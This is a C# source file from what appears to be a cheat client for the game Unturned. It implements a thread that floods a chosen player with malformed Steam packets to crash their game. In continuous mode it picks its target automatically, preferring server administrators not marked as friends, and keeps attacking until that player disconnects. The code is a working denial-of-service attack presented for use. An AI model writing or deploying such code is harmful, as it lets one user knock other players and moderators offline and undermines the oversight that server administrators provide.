using System.Linq;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
using Thanking.Utilities;
using UnityEngine;

namespace Thanking.Threads
{
    public static class PlayerCrashThread
    {
        public static bool PlayerCrashEnabled;
        public static bool ContinuousPlayerCrash;
        public static CSteamID CrashTarget;
        
        [Thread]
        public static void Start()
        {
            #if DEBUG
			DebugUtilities.Log("Player Crash Thread Started");
			#endif
            Provider.onEnemyDisconnected += OnDisconnect;
     
            while (true)
            {
                if (PlayerCrashEnabled)
                    Provider.send(CrashTarget, (ESteamPacket)255, new byte[0], 1, 0);
                
                else
                {
                    if (!ContinuousPlayerCrash || Provider.clients.Count == 0)
                        continue;

                    PlayerCrashEnabled = true;
                    CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 1 : 0)
                        .First(p => p.isAdmin && !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
                }
            }
        }

        public static void OnDisconnect(SteamPlayer player)
        {
            if (player.playerID.steamID == CrashTarget)
                PlayerCrashEnabled = false;
        }
    }
}
